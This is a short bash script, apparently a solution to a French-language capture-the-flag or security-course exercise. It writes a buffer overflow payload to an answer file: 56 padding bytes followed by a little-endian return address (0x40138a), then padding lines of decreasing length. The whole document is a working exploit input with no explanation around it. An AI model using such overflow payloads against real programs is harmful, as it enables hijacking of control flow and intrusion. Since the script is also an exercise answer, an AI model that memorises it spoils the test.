#!/bin/bash

echo  $(python3 -c "print('b'*56+'\x8a\x13\x40')") > fichier-reponse.txt
i=55
while [ $i -gt 32 ]
do
    echo $(python3 -c "print('b'*$i)") >> fichier-reponse.txt
    i=$(($i-1))
done
